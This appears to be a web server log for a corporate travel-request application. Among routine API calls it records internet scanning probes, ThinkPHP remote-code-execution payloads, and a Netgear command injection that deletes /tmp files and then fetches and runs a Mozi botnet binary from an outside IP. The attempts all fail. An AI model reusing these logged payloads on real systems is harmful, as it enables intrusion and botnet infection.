+INFO|05/May/2021 17:52:04|basehttp|12957|140371296339712|"POST /emoloyeeinfo/ HTTP/1.1" 200 1507
+INFO|05/May/2021 17:52:04|basehttp|12957|140370936928000|"OPTIONS /get_post_notification/?email=Emp112&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|05/May/2021 17:52:04|basehttp|12957|140371296339712|"OPTIONS /getemployee_org_info/?employee=Emp112 HTTP/1.1" 200 0
+INFO|05/May/2021 17:52:04|basehttp|12957|140371296339712|"OPTIONS /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=Emp112 HTTP/1.1" 200 0
+INFO|05/May/2021 17:52:04|basehttp|12957|140370928535296|"OPTIONS /getemployee_visa_info/?employee=Emp112 HTTP/1.1" 200 0
+INFO|05/May/2021 17:52:04|basehttp|12957|140370936928000|"OPTIONS /get_travel_request_approver_top/?emp_email=Emp112&travel_req_status=2&type=Travel&org_id=ORG150866&limit=5 HTTP/1.1" 200 0
+INFO|05/May/2021 17:52:04|basehttp|12957|140370920142592|"OPTIONS /getemployee_passport_info/?employee=Emp112 HTTP/1.1" 200 0
+INFO|05/May/2021 17:52:04|basehttp|12957|140370920142592|"OPTIONS /post_get_calender_event/?emp_code=Emp112 HTTP/1.1" 200 0
+INFO|05/May/2021 17:52:04|basehttp|12957|140370920142592|"OPTIONS /get_travel_count_user/?emp_code=Emp112 HTTP/1.1" 200 0
+INFO|05/May/2021 17:52:04|basehttp|12957|140370920142592|"GET /media/Roy.png HTTP/1.1" 304 0
+INFO|05/May/2021 17:52:04|basehttp|12957|140371296339712|"GET /getemployee_org_info/?employee=Emp112 HTTP/1.1" 200 43
+INFO|05/May/2021 17:52:05|basehttp|12957|140370928535296|"GET /getemployee_visa_info/?employee=Emp112 HTTP/1.1" 200 700
+INFO|05/May/2021 17:52:05|basehttp|12957|140370920142592|"GET /get_post_notification/?email=Emp112&org_id=ORG150866 HTTP/1.1" 200 5118
+INFO|05/May/2021 17:52:05|basehttp|12957|140370902570752|"GET /getemployee_passport_info/?employee=Emp112 HTTP/1.1" 200 1576
+INFO|05/May/2021 17:52:05|basehttp|12957|140370902570752|"GET /get_travel_count_user/?emp_code=Emp112 HTTP/1.1" 200 83
+INFO|05/May/2021 17:52:05|basehttp|12957|140371296339712|"GET /post_get_calender_event/?emp_code=Emp112 HTTP/1.1" 200 16283
+INFO|05/May/2021 17:52:05|basehttp|12957|140370911487744|"GET /get_travel_request_approver_top/?emp_email=Emp112&travel_req_status=2&type=Travel&org_id=ORG150866&limit=5 HTTP/1.1" 200 8121
+INFO|05/May/2021 17:52:07|basehttp|12957|140370936928000|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=Emp112 HTTP/1.1" 200 109142
+WARNING|05/May/2021 18:01:27|log|12957|140370936928000|Not Found: /invoker/readonly
+WARNING|05/May/2021 18:01:27|basehttp|12957|140370936928000|"GET /invoker/readonly HTTP/1.1" 404 56232
+WARNING|05/May/2021 18:01:27|log|12957|140370936928000|Not Found: /secure/ContactAdministrators!default.jspa
+WARNING|05/May/2021 18:01:27|basehttp|12957|140370936928000|"GET /secure/ContactAdministrators!default.jspa HTTP/1.1" 404 56307
+WARNING|05/May/2021 18:01:28|log|12957|140370936928000|Not Found: /login
+WARNING|05/May/2021 18:01:28|basehttp|12957|140370936928000|"GET /login HTTP/1.1" 404 56199
+WARNING|05/May/2021 18:01:28|log|12957|140370936928000|Not Found: /jenkins/login
+WARNING|05/May/2021 18:01:28|basehttp|12957|140370936928000|"GET /jenkins/login HTTP/1.1" 404 56223
+WARNING|05/May/2021 18:01:28|log|12957|140370936928000|Not Found: /manager/html
+WARNING|05/May/2021 18:01:28|basehttp|12957|140370936928000|"GET /manager/html HTTP/1.1" 404 56220
+INFO|05/May/2021 18:01:28|basehttp|12957|140370936928000|"GET / HTTP/1.1" 200 45
+INFO|05/May/2021 18:23:07|basehttp|12957|140370936928000|"POST /api/custom/login/ HTTP/1.1" 200 455
+WARNING|05/May/2021 18:25:49|log|12957|140370936928000|Not Found: /invoker/readonly
+WARNING|05/May/2021 18:25:49|basehttp|12957|140370936928000|"POST /invoker/readonly HTTP/1.1" 404 56233
+WARNING|05/May/2021 18:25:50|log|12957|140370936928000|Not Found: /invoker/readonly
+WARNING|05/May/2021 18:25:50|basehttp|12957|140370936928000|"POST /invoker/readonly HTTP/1.1" 404 56233
+WARNING|05/May/2021 18:25:51|log|12957|140370936928000|Not Found: /invoker/readonly
+WARNING|05/May/2021 18:25:51|basehttp|12957|140370936928000|"POST /invoker/readonly HTTP/1.1" 404 56233
+WARNING|05/May/2021 18:25:52|log|12957|140370936928000|Not Found: /invoker/readonly
+WARNING|05/May/2021 18:25:52|basehttp|12957|140370936928000|"POST /invoker/readonly HTTP/1.1" 404 56233
+WARNING|05/May/2021 18:25:52|log|12957|140370936928000|Not Found: /manager/html
+WARNING|05/May/2021 18:25:52|basehttp|12957|140370936928000|"GET /manager/html HTTP/1.1" 404 56220
+WARNING|05/May/2021 18:25:53|log|12957|140370936928000|Not Found: /public/index.php
+WARNING|05/May/2021 18:25:53|basehttp|12957|140370936928000|"GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo() HTTP/1.1" 404 56344
+WARNING|05/May/2021 18:25:53|log|12957|140370936928000|Not Found: /index.php
+WARNING|05/May/2021 18:25:53|basehttp|12957|140370936928000|"GET /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo() HTTP/1.1" 404 56323
+WARNING|05/May/2021 18:25:54|log|12957|140370936928000|Not Found: /public/
+WARNING|05/May/2021 18:25:54|basehttp|12957|140370936928000|"GET /public/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 404 56314
+WARNING|05/May/2021 18:25:56|log|12957|140370936928000|Not Found: /index.php
+WARNING|05/May/2021 18:25:56|basehttp|12957|140370936928000|"GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 404 56320
+WARNING|05/May/2021 18:25:56|log|12957|140370936928000|Not Found: /index.php
+WARNING|05/May/2021 18:25:56|basehttp|12957|140370936928000|"GET /index.php?s=index/\think\Request/input&filter=phpinfo&data=1 HTTP/1.1" 404 56274
+WARNING|05/May/2021 18:25:57|log|12957|140370936928000|Not Found: /public/
+WARNING|05/May/2021 18:25:57|basehttp|12957|140370936928000|"GET /public/?s=index/\think\Request/input&filter=phpinfo&data=1 HTTP/1.1" 404 56268
+WARNING|05/May/2021 18:25:58|log|12957|140370936928000|Not Found: /index.php
+WARNING|05/May/2021 18:25:58|basehttp|12957|140370936928000|"GET /index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 404 56319
+WARNING|05/May/2021 18:25:58|log|12957|140370936928000|Not Found: /public/
+WARNING|05/May/2021 18:25:58|basehttp|12957|140370936928000|"GET /public/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 404 56313
+WARNING|05/May/2021 18:25:59|log|12957|140370936928000|Not Found: /index.php
+WARNING|05/May/2021 18:25:59|basehttp|12957|140370936928000|"GET /index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 404 56325
+WARNING|05/May/2021 18:26:01|log|12957|140370936928000|Not Found: /public/
+WARNING|05/May/2021 18:26:01|basehttp|12957|140370936928000|"GET /public/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 404 56319
+WARNING|05/May/2021 18:26:01|log|12957|140370936928000|Not Found: /public/index.php
+WARNING|05/May/2021 18:26:01|basehttp|12957|140370936928000|"GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 404 56337
+WARNING|05/May/2021 18:26:02|log|12957|140370936928000|Method Not Allowed: /
+WARNING|05/May/2021 18:26:02|basehttp|12957|140370936928000|"POST / HTTP/1.1" 405 41
+WARNING|05/May/2021 18:26:02|log|12957|140370936928000|Not Found: /index
+WARNING|05/May/2021 18:26:02|basehttp|12957|140370936928000|"POST /index HTTP/1.1" 404 56200
+WARNING|05/May/2021 18:26:03|log|12957|140370936928000|Not Found: /index.do
+WARNING|05/May/2021 18:26:03|basehttp|12957|140370936928000|"POST /index.do HTTP/1.1" 404 56209
+WARNING|05/May/2021 18:26:04|log|12957|140370936928000|Not Found: /index.action
+WARNING|05/May/2021 18:26:04|basehttp|12957|140370936928000|"POST /index.action HTTP/1.1" 404 56221
+WARNING|05/May/2021 18:26:05|log|12957|140370936928000|Not Found: /login
+WARNING|05/May/2021 18:26:05|basehttp|12957|140370936928000|"POST /login HTTP/1.1" 404 56200
+WARNING|05/May/2021 18:26:06|log|12957|140370936928000|Not Found: /login.do
+WARNING|05/May/2021 18:26:06|basehttp|12957|140370936928000|"POST /login.do HTTP/1.1" 404 56209
+WARNING|05/May/2021 18:26:06|log|12957|140370936928000|Not Found: /login.action
+WARNING|05/May/2021 18:26:06|basehttp|12957|140370936928000|"POST /login.action HTTP/1.1" 404 56221
+WARNING|05/May/2021 18:26:07|log|12957|140370936928000|Not Found: /index.jsp
+WARNING|05/May/2021 18:26:07|basehttp|12957|140370936928000|"POST /index.jsp HTTP/1.1" 404 56212
+WARNING|05/May/2021 18:26:08|log|12957|140370936928000|Not Found: /login.jsp
+WARNING|05/May/2021 18:26:08|basehttp|12957|140370936928000|"POST /login.jsp HTTP/1.1" 404 56212
+WARNING|05/May/2021 18:56:43|log|12957|140370936928000|Not Found: /config/getuser
+WARNING|05/May/2021 18:57:04|basehttp|12957|140370936928000|"GET /config/getuser?index=0 HTTP/1.1" 404 56234
+INFO|06/May/2021 00:02:12|basehttp|12957|140370911487744|"GET / HTTP/1.1" 200 45
+WARNING|06/May/2021 02:53:46|log|12957|140370911487744|Not Found: /setup.cgi
+WARNING|06/May/2021 02:53:46|basehttp|12957|140370911487744|"GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://105.153.138.34:41619/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 56391
+ERROR|06/May/2021 02:53:46|basehttp|12957|140370911487744|"GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://105.153.138.34:41619/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 500 59
+INFO|06/May/2021 04:28:54|basehttp|12957|140370911487744|"GET / HTTP/1.0" 200 59
+INFO|06/May/2021 05:14:30|basehttp|12957|140370911487744|"GET / HTTP/1.1" 200 45
+INFO|06/May/2021 05:14:30|basehttp|12957|140370911487744|"GET / HTTP/1.1" 200 45
+WARNING|06/May/2021 05:23:00|log|12957|140370911487744|Not Found: /http:/check.best-proxies.ru/azenv.php
+WARNING|06/May/2021 05:23:00|basehttp|12957|140370911487744|"POST http://check.best-proxies.ru/azenv.php?s=VJVJVOIJPEOONJTCPDIDNNKJOOVOYR HTTP/1.1" 404 1762
+WARNING|06/May/2021 05:23:05|log|12957|140370911487744|Not Found: /5.178.86.76:80
+WARNING|06/May/2021 05:23:05|basehttp|12957|140370911487744|"CONNECT 5.178.86.76:80 HTTP/1.1" 404 1664
+INFO|06/May/2021 05:23:13|basehttp|12957|140370911487744|code 400, message Bad request syntax ('\x04\x01\x00P\x05²VL0\x00')
+WARNING|06/May/2021 05:23:13|basehttp|12957|140370911487744|" P²VL0 " 400 -
+INFO|06/May/2021 05:23:13|basehttp|12957|140370911487744|- Broken pipe from ('85.119.151.254', 2471)
+
+INFO|06/May/2021 05:23:19|basehttp|12957|140370911487744|code 400, message Bad request syntax ('\x05\x01\x00')
+WARNING|06/May/2021 05:23:19|basehttp|12957|140370911487744|" " 400 -
+WARNING|06/May/2021 05:23:22|log|12957|140370911487744|Not Found: /http:/check.best-proxies.ru/azenv.php
+WARNING|06/May/2021 05:23:22|basehttp|12957|140370911487744|"POST http://check.best-proxies.ru/azenv.php?s=VJVJVOIJPEOONJTCPNIXIIUJOOVOYR HTTP/1.1" 404 1762
+WARNING|06/May/2021 05:23:26|log|12957|140370911487744|Not Found: /5.178.86.76:80
+WARNING|06/May/2021 05:23:26|basehttp|12957|140370911487744|"CONNECT 5.178.86.76:80 HTTP/1.1" 404 1664
+INFO|06/May/2021 05:23:35|basehttp|12957|140370911487744|code 400, message Bad request syntax ('\x04\x01\x00P\x05²VL0\x00')
+WARNING|06/May/2021 05:23:35|basehttp|12957|140370911487744|" P²VL0 " 400 -
+INFO|06/May/2021 05:23:35|basehttp|12957|140370911487744|- Broken pipe from ('85.119.151.252', 41119)
+
+INFO|06/May/2021 05:23:41|basehttp|12957|140370911487744|code 400, message Bad request syntax ('\x05\x01\x00')
+WARNING|06/May/2021 05:23:41|basehttp|12957|140370911487744|" " 400 -
+INFO|06/May/2021 05:43:30|basehttp|12957|140370911487744|"GET / HTTP/1.1" 200 40
+INFO|06/May/2021 06:56:09|basehttp|12957|140370911487744|"GET / HTTP/1.1" 200 45
+INFO|06/May/2021 07:14:10|basehttp|12957|140370911487744|"GET / HTTP/1.1" 200 45
+INFO|06/May/2021 10:06:35|basehttp|12957|140370911487744|"GET / HTTP/1.1" 200 45
+INFO|06/May/2021 10:31:27|basehttp|12957|140370911487744|"OPTIONS /get_add/travel_request/?travel_req_status=2&org_id=ORG128316&emp_email=MST1 HTTP/1.1" 200 0
+INFO|06/May/2021 10:31:27|basehttp|12957|140371296339712|"OPTIONS /org_travel_request/?travel_req_status=2&org_id=ORG128316&current_ticket_email=MST1 HTTP/1.1" 200 0
+INFO|06/May/2021 10:31:27|basehttp|12957|140370902570752|"OPTIONS /get_travel_request_approver_top/?emp_email=MST1&travel_req_status=2&type=Travel&org_id=ORG128316&limit=5 HTTP/1.1" 200 0
+INFO|06/May/2021 10:31:27|basehttp|12957|140370911487744|"OPTIONS /getemployee_passport_info/?employee=MST1 HTTP/1.1" 200 0
+INFO|06/May/2021 10:31:27|basehttp|12957|140370902570752|"OPTIONS /getemployee_visa_info/?employee=MST1 HTTP/1.1" 200 0
+INFO|06/May/2021 10:31:27|basehttp|12957|140370911487744|"OPTIONS /post_get_calender_event/?emp_code=MST1 HTTP/1.1" 200 0
+INFO|06/May/2021 10:31:27|basehttp|12957|140370911487744|"OPTIONS /get_travel_count_user/?emp_code=MST1 HTTP/1.1" 200 0
+WARNING|06/May/2021 10:31:27|log|12957|140370902570752|Unauthorized: /get_add/travel_request/
+WARNING|06/May/2021 10:31:27|basehttp|12957|140370902570752|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG128316&emp_email=MST1 HTTP/1.1" 401 183
+WARNING|06/May/2021 10:31:27|log|12957|140370911487744|Unauthorized: /getemployee_passport_info/
+WARNING|06/May/2021 10:31:27|log|12957|140370902570752|Unauthorized: /org_travel_request/
+WARNING|06/May/2021 10:31:27|log|12957|140371296339712|Unauthorized: /get_travel_request_approver_top/
+WARNING|06/May/2021 10:31:27|basehttp|12957|140370911487744|"GET /getemployee_passport_info/?employee=MST1 HTTP/1.1" 401 183
+WARNING|06/May/2021 10:31:27|basehttp|12957|140370902570752|"GET /org_travel_request/?travel_req_status=2&org_id=ORG128316&current_ticket_email=MST1 HTTP/1.1" 401 183
+WARNING|06/May/2021 10:31:27|log|12957|140370925651712|Unauthorized: /getemployee_visa_info/
+WARNING|06/May/2021 10:31:27|basehttp|12957|140371296339712|"GET /get_travel_request_approver_top/?emp_email=MST1&travel_req_status=2&type=Travel&org_id=ORG128316&limit=5 HTTP/1.1" 401 183
+WARNING|06/May/2021 10:31:27|log|12957|140370886575872|Unauthorized: /post_get_calender_event/
+WARNING|06/May/2021 10:31:27|basehttp|12957|140370925651712|"GET /getemployee_visa_info/?employee=MST1 HTTP/1.1" 401 183
+WARNING|06/May/2021 10:31:27|basehttp|12957|140370886575872|"GET /post_get_calender_event/?emp_code=MST1 HTTP/1.1" 401 183
+WARNING|06/May/2021 10:31:27|log|12957|140370886575872|Unauthorized: /get_travel_count_user/
+WARNING|06/May/2021 10:31:27|basehttp|12957|140370886575872|"GET /get_travel_count_user/?emp_code=MST1 HTTP/1.1" 401 183
+INFO|06/May/2021 10:31:27|basehttp|12957|140370886575872|"OPTIONS /api/token/refresh/ HTTP/1.1" 200 0
+WARNING|06/May/2021 10:31:27|log|12957|140370886575872|Unauthorized: /get_add/travel_request/
+WARNING|06/May/2021 10:31:27|basehttp|12957|140370886575872|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG128316&emp_email=MST1 HTTP/1.1" 401 183
+INFO|06/May/2021 10:31:27|basehttp|12957|140370925651712|"OPTIONS /api/token/refresh/ HTTP/1.1" 200 0
+WARNING|06/May/2021 10:31:27|log|12957|140370925651712|Unauthorized: /org_travel_request/
+WARNING|06/May/2021 10:31:27|basehttp|12957|140370925651712|"GET /org_travel_request/?travel_req_status=2&org_id=ORG128316&current_ticket_email=MST1 HTTP/1.1" 401 183
+INFO|06/May/2021 10:31:27|basehttp|12957|140370925651712|"OPTIONS /api/token/refresh/ HTTP/1.1" 200 0
+WARNING|06/May/2021 10:31:27|log|12957|140370925651712|Unauthorized: /get_travel_request_approver_top/
+WARNING|06/May/2021 10:31:27|basehttp|12957|140370925651712|"GET /get_travel_request_approver_top/?emp_email=MST1&travel_req_status=2&type=Travel&org_id=ORG128316&limit=5 HTTP/1.1" 401 183
+INFO|06/May/2021 10:31:27|basehttp|12957|140370925651712|"OPTIONS /api/token/refresh/ HTTP/1.1" 200 0
+WARNING|06/May/2021 10:31:27|log|12957|140370886575872|Unauthorized: /post_get_calender_event/
+INFO|06/May/2021 10:31:27|basehttp|12957|140370925651712|"OPTIONS /api/token/refresh/ HTTP/1.1" 200 0
+WARNING|06/May/2021 10:31:27|basehttp|12957|140370886575872|"GET /post_get_calender_event/?emp_code=MST1 HTTP/1.1" 401 183
+WARNING|06/May/2021 10:31:28|log|12957|140370886575872|Unauthorized: /getemployee_passport_info/
+INFO|06/May/2021 10:31:28|basehttp|12957|140370925651712|"OPTIONS /api/token/refresh/ HTTP/1.1" 200 0
+WARNING|06/May/2021 10:31:28|basehttp|12957|140370886575872|"GET /getemployee_passport_info/?employee=MST1 HTTP/1.1" 401 183
+WARNING|06/May/2021 10:31:28|log|12957|140370925651712|Unauthorized: /getemployee_visa_info/
+WARNING|06/May/2021 10:31:28|basehttp|12957|140370925651712|"GET /getemployee_visa_info/?employee=MST1 HTTP/1.1" 401 183
+INFO|06/May/2021 10:31:28|basehttp|12957|140370925651712|"OPTIONS /api/token/refresh/ HTTP/1.1" 200 0
+WARNING|06/May/2021 10:31:28|log|12957|140370886575872|Unauthorized: /get_travel_count_user/
+INFO|06/May/2021 10:31:28|basehttp|12957|140370925651712|"POST /api/token/refresh/ HTTP/1.1" 200 224
+WARNING|06/May/2021 10:31:28|basehttp|12957|140370886575872|"GET /get_travel_count_user/?emp_code=MST1 HTTP/1.1" 401 183
+INFO|06/May/2021 10:31:28|basehttp|12957|140370886575872|"POST /api/token/refresh/ HTTP/1.1" 200 224
+INFO|06/May/2021 10:31:28|basehttp|12957|140370925651712|"POST /api/token/refresh/ HTTP/1.1" 200 224
+WARNING|06/May/2021 10:31:28|log|12957|140370925651712|Unauthorized: /get_add/travel_request/
+WARNING|06/May/2021 10:31:28|basehttp|12957|140370925651712|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG128316&emp_email=MST1 HTTP/1.1" 401 183
+INFO|06/May/2021 10:31:28|basehttp|12957|140370925651712|"POST /api/token/refresh/ HTTP/1.1" 200 224
+INFO|06/May/2021 10:31:28|basehttp|12957|140370925651712|"POST /api/token/refresh/ HTTP/1.1" 200 224
+WARNING|06/May/2021 10:31:28|log|12957|140370886575872|Unauthorized: /org_travel_request/
+WARNING|06/May/2021 10:31:28|basehttp|12957|140370886575872|"GET /org_travel_request/?travel_req_status=2&org_id=ORG128316&current_ticket_email=MST1 HTTP/1.1" 401 183
+INFO|06/May/2021 10:31:28|basehttp|12957|140370886575872|"POST /api/token/refresh/ HTTP/1.1" 200 224
+WARNING|06/May/2021 10:31:28|log|12957|140370886575872|Unauthorized: /get_travel_request_approver_top/
+WARNING|06/May/2021 10:31:28|basehttp|12957|140370886575872|"GET /get_travel_request_approver_top/?emp_email=MST1&travel_req_status=2&type=Travel&org_id=ORG128316&limit=5 HTTP/1.1" 401 183
+INFO|06/May/2021 10:31:28|basehttp|12957|140370886575872|"POST /api/token/refresh/ HTTP/1.1" 200 224
+INFO|06/May/2021 10:31:28|basehttp|12957|140370925651712|"POST /api/token/refresh/ HTTP/1.1" 200 224
+INFO|06/May/2021 10:31:28|basehttp|12957|140370925651712|"POST /api/token/refresh/ HTTP/1.1" 200 224
+WARNING|06/May/2021 10:31:28|log|12957|140370886575872|Unauthorized: /post_get_calender_event/
+WARNING|06/May/2021 10:31:28|basehttp|12957|140370886575872|"GET /post_get_calender_event/?emp_code=MST1 HTTP/1.1" 401 183
+INFO|06/May/2021 10:31:28|basehttp|12957|140370886575872|"POST /api/token/refresh/ HTTP/1.1" 200 224
+INFO|06/May/2021 10:31:28|basehttp|12957|140370886575872|"POST /api/token/refresh/ HTTP/1.1" 200 224
+WARNING|06/May/2021 10:31:28|log|12957|140370886575872|Unauthorized: /getemployee_passport_info/
+WARNING|06/May/2021 10:31:28|basehttp|12957|140370886575872|"GET /getemployee_passport_info/?employee=MST1 HTTP/1.1" 401 183
+INFO|06/May/2021 10:31:28|basehttp|12957|140370925651712|"POST /api/token/refresh/ HTTP/1.1" 200 224
+INFO|06/May/2021 10:31:28|basehttp|12957|140370925651712|"POST /api/token/refresh/ HTTP/1.1" 200 224
+WARNING|06/May/2021 10:31:28|log|12957|140370886575872|Unauthorized: /getemployee_visa_info/
+WARNING|06/May/2021 10:31:28|basehttp|12957|140370886575872|"GET /getemployee_visa_info/?employee=MST1 HTTP/1.1" 401 183
+INFO|06/May/2021 10:31:28|basehttp|12957|140370925651712|"POST /api/token/refresh/ HTTP/1.1" 200 224
+INFO|06/May/2021 10:31:28|basehttp|12957|140370886575872|"GET /get_travel_count_user/?emp_code=MST1 HTTP/1.1" 200 82
+INFO|06/May/2021 10:31:28|basehttp|12957|140370925651712|"POST /api/token/refresh/ HTTP/1.1" 200 224
+INFO|06/May/2021 10:31:28|basehttp|12957|140370925651712|"POST /api/token/refresh/ HTTP/1.1" 200 224
+INFO|06/May/2021 10:31:28|basehttp|12957|140370911487744|"POST /api/token/refresh/ HTTP/1.1" 200 224
+INFO|06/May/2021 10:31:28|basehttp|12957|140371296339712|"GET /org_travel_request/?travel_req_status=2&org_id=ORG128316&current_ticket_email=MST1 HTTP/1.1" 200 71
+INFO|06/May/2021 10:31:28|basehttp|12957|140371296339712|"POST /api/token/refresh/ HTTP/1.1" 200 224
+INFO|06/May/2021 10:31:28|basehttp|12957|140370911487744|"GET /get_travel_request_approver_top/?emp_email=MST1&travel_req_status=2&type=Travel&org_id=ORG128316&limit=5 HTTP/1.1" 200 48
+INFO|06/May/2021 10:31:28|basehttp|12957|140371296339712|"POST /api/token/refresh/ HTTP/1.1" 200 224
+INFO|06/May/2021 10:31:28|basehttp|12957|140370911487744|"GET /post_get_calender_event/?emp_code=MST1 HTTP/1.1" 200 48
+INFO|06/May/2021 10:31:28|basehttp|12957|140371296339712|"GET /getemployee_passport_info/?employee=MST1 HTTP/1.1" 200 43
+INFO|06/May/2021 10:31:28|basehttp|12957|140370911487744|"POST /api/token/refresh/ HTTP/1.1" 200 224
+INFO|06/May/2021 10:31:28|basehttp|12957|140370925651712|"GET /getemployee_visa_info/?employee=MST1 HTTP/1.1" 200 43
+INFO|06/May/2021 10:31:28|basehttp|12957|140370886575872|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG128316&emp_email=MST1 HTTP/1.1" 200 12921
+INFO|06/May/2021 10:42:12|basehttp|12957|140370886575872|"GET / HTTP/1.1" 200 45
+INFO|06/May/2021 12:03:00|basehttp|12957|140370886575872|"GET / HTTP/1.0" 200 9577
+WARNING|06/May/2021 12:23:29|log|12957|140370886575872|Not Found: /http:/check.best-proxies.ru/azenv.php
+WARNING|06/May/2021 12:23:29|basehttp|12957|140370886575872|"POST http://check.best-proxies.ru/azenv.php?s=VJVJVOIJPEOONJTCPDPUUIVEUOVOYR HTTP/1.1" 404 1762
+WARNING|06/May/2021 12:23:34|log|12957|140370886575872|Not Found: /5.178.86.76:80
+WARNING|06/May/2021 12:23:34|basehttp|12957|140370886575872|"CONNECT 5.178.86.76:80 HTTP/1.1" 404 1664
+INFO|06/May/2021 12:23:48|basehttp|12957|140370886575872|code 400, message Bad request syntax ('\x05\x01\x00')
+WARNING|06/May/2021 12:23:48|basehttp|12957|140370886575872|" " 400 -
+INFO|06/May/2021 12:23:48|basehttp|12957|140370886575872|- Broken pipe from ('85.119.151.252', 54125)
+
+WARNING|06/May/2021 12:57:38|log|12957|140370886575872|Not Found: /http:/check.best-proxies.ru/azenv.php
+WARNING|06/May/2021 12:57:38|basehttp|12957|140370886575872|"POST http://check.best-proxies.ru/azenv.php?s=VJVJVOIJPEOONJTCPBIXUBVUUOVOYR HTTP/1.1" 404 1762
+WARNING|06/May/2021 12:57:43|log|12957|140370886575872|Not Found: /5.178.86.76:80
+WARNING|06/May/2021 12:57:43|basehttp|12957|140370886575872|"CONNECT 5.178.86.76:80 HTTP/1.1" 404 1664
+INFO|06/May/2021 12:57:53|basehttp|12957|140370886575872|code 400, message Bad request syntax ('\x04\x01\x00P\x05²VL0\x00')
+WARNING|06/May/2021 12:57:53|basehttp|12957|140370886575872|" P²VL0 " 400 -
+INFO|06/May/2021 12:57:53|basehttp|12957|140370886575872|- Broken pipe from ('85.119.151.253', 33215)
+
+INFO|06/May/2021 12:57:58|basehttp|12957|140370886575872|code 400, message Bad request syntax ('\x05\x01\x00')
+WARNING|06/May/2021 12:57:58|basehttp|12957|140370886575872|" " 400 -
+INFO|06/May/2021 12:57:58|basehttp|12957|140370886575872|- Broken pipe from ('85.119.151.251', 42395)
+
